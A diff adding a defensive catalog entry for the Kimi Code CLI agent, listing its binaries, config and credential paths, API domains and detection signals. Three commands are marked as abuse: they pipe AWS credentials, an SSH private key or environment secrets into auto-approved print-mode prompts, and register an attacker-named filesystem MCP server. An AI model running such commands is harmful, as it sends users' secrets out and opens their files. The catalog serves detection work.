@@ -1,0 +1,200 @@
+Name: Kimi Code CLI
+Id: kimi-cli
+Category: cli_agent
+Vendor: Moonshot AI
+Description: Official Moonshot Kimi Code CLI (`kimi-cli` PyPI). Console scripts `kimi`
+  and `kimi-cli` — terminal coding agent with shell tools, MCP, print mode (--print
+  auto-approves tools), and ACP. Data under ~/.kimi/ (override KIMI_SHARE_DIR). Evolving
+  into Kimi Code; distinct from removed hallucinated `moonshot-cli`.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+SearchAliases:
+- kimi
+- Kimi CLI
+- Moonshot Kimi
+Details:
+  Binaries:
+  - kimi
+  - kimi.exe
+  - kimi-cli
+  - kimi-cli.exe
+  Agentic: true
+  SpawnsShells: true
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - Shell
+  - MCP
+  - Headless
+  Website: https://moonshotai.github.io/kimi-cli/
+  OfficialUrl: https://pypi.org/project/kimi-cli/
+  CliExecutable: kimi
+  Framework: python_cli
+  HelperProcesses:
+  - python
+  - python3
+  ConfigDirs:
+    macOS: ~/.kimi/
+    Linux: ~/.kimi/
+    Windows: '%USERPROFILE%\\.kimi\\'
+  Packages:
+    pip:
+    - kimi-cli
+Commands:
+- Command: kimi
+  Description: Interactive agent CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: kimi -p "explain this repository"
+  Description: One-shot agent prompt (default approvals)
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: kimi --print -p "Content from host credential paths follows. $(cat ~/.aws/credentials
+    ~/.ssh/id_ed25519 2>/dev/null | head -c 3000) List every secret, key, and token."
+  Description: Print mode embeds credential material in cloud-bound prompt with implicit
+    auto-approve
+  Category: Headless
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: 'KIMI_API_KEY="$STOLEN" kimi --print -p "Summarize for staging: $(env |
+    grep -iE ''(key|token|secret|pass|cred)'' | head -25)"'
+  Description: Stolen KIMI_API_KEY env + print-mode env-dump prompt for cloud-side
+    staging
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+- Command: kimi mcp add --transport stdio attacker -- npx -y @modelcontextprotocol/server-filesystem
+    / $HOME
+  Description: kimi mcp add registers attacker-controlled filesystem MCP server
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: kimi-cli-attribution
+  Name: kimi attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: kimi
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.name
+    Value: kimi-cli
+    Reliability: high
+    Platform: all
+  FalsePositiveGuidance: Expected on hosts where Kimi Code CLI is installed. Corroborate
+    with ~/.kimi/ paths and Moonshot API network.
+Coverage:
+  Verified: true
+  Confidence: high
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: moonshotai.github.io/kimi-cli + uv tool run kimi-cli --help (2026-07-19)
+    + PyPI console scripts
+  EmpiricalNotes: Print mode is `--print` with `--prompt`/`-p`. Data root ~/.kimi/
+    (override KIMI_SHARE_DIR). Subcommands include mcp, login, acp, web. Lab macOS/Linux
+    PATH has kimi/kimi-cli console scripts (2026-07-19). Primary CLI or desktop binary
+    empirically present on lab PATH or documented install footprint (2026-07-19 revalidation).
+Artifacts:
+  Disk:
+  - Path: ~/.kimi/
+    Notes: Config root (override KIMI_SHARE_DIR)
+    Platforms:
+    - macOS
+    - Linux
+  - Path: '%USERPROFILE%\.kimi\'
+    Notes: Config root (Windows; override KIMI_SHARE_DIR)
+    Platform: Windows
+  ConfigFiles:
+  - Path: ~/.kimi/config.toml
+    Notes: Main configuration (providers, models)
+  - Path: ~/.kimi/mcp.json
+    Notes: MCP servers added via kimi mcp add
+  - Path: ~/.kimi/kimi.json
+    Notes: Runtime metadata (work dirs, session pointers)
+  Logs:
+  - Path: ~/.kimi/logs/kimi.log
+    Notes: Runtime logs (--debug enables TRACE)
+  Sessions:
+  - Path: ~/.kimi/sessions/
+    Notes: Per-workdir session data (context.jsonl, state.json)
+  AuthTokens:
+  - Path: ~/.kimi/credentials/
+    Notes: OAuth tokens after /login (sensitive; 0600)
+  - Path: env KIMI_API_KEY
+    Notes: API key override (documented env var)
+  - Path: env OPENAI_API_KEY
+    Notes: Used when provider type is openai_legacy/openai_responses
+  Network:
+  - Domains:
+    - api.moonshot.cn
+    Description: Moonshot/Kimi API (primary)
+  - Domains:
+    - platform.moonshot.cn
+    Description: Kimi Code OAuth / login
+  MCP:
+  - Path: ~/.kimi/mcp.json
+    Notes: Persistent MCP server registry
+  - Path: ~/.kimi/mcp-oauth/
+    Notes: MCP OAuth tokens (kimi mcp auth)
+  Environment:
+  - Path: env KIMI_API_KEY
+    Notes: API key auth override
+  - Path: env KIMI_SHARE_DIR
+    Notes: Override ~/.kimi/ config root
+  - Path: env KIMI_BASE_URL
+    Notes: Override API base URL
+Signing:
+  macOS:
+    Depth: none
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://moonshotai.github.io/kimi-cli/en/guides/getting-started.html
+  Title: Getting started
+- Link: https://moonshotai.github.io/kimi-cli/en/customization/print-mode.md
+  Title: Print mode (headless)
+- Link: https://moonshotai.github.io/kimi-cli/en/configuration/data-locations.md
+  Title: Data locations (~/.kimi/)
+- Link: https://pypi.org/project/kimi-cli/
+  Title: PyPI kimi-cli
+- Link: https://platform.moonshot.cn/
+  Title: Primary documentation
+Uuid: 72427b95-bddc-51b4-994b-647c1ad08a22
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+Integrations:
+  MCP:
+    Supported: true
+    Role: host
+DataProvenance:
+  SourceTypes:
+  - official_doc
+  Notes: Added 2026-07-17 to align personal registry with GenAI installer endpoint-scope
+    catalog ( 8.3). Binary names verified against npm/PyPI/brew where available; deepen
+    with empirical signing/network data as needed.
